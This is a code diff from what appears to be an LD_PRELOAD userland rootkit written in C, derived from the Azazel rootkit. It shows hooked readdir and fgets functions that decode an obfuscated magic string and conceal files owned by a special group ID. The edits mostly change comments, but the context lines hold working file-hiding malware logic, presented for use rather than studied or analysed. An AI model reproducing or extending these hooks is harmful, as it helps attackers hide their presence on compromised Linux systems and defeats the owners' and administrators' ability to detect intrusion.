@@ -561,6 +561,8 @@ int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpat
 /_/_/_/_/  \_, /\_,_/\_, / 
           /___/     /___/
 */ 
+
+// this hook is from azazel, creds to all original authors
 struct dirent *readdir(DIR *dirp)
 { 
 	HOOK(readdir);
@@ -568,7 +570,7 @@ struct dirent *readdir(DIR *dirp)
 	#ifdef DEBUG 
 	printf("[!] readdir hooked\n"); 
 	#endif
-	// this hook made me suicidal 
+	
 	char *magic = strdup(MAGIC); xor(magic); 
 	char path[PATH_MAX + 1];
 	struct dirent *dir; 
@@ -850,14 +852,14 @@ char *fgets(char *s, int size, FILE *stream)
 		return(p);
 	if (owned())
 		return old_fgets(s, size, stream);
-	if (old_access(s, F_OK) != -1) // is s a file or directory? 
+	if (old_access(s, F_OK) != -1) 
 	{ 
 		old___xstat(_STAT_VER, s, &filestat); 
 		char *magic = strdup(MAGIC); xor(magic);
 		if (filestat.st_gid == MAGICGID)
 		{ 
 			CLEAN(magic); 
-			return NULL; // s is owned by magic; return null
+			return NULL; 
 		}
 		else
 		{
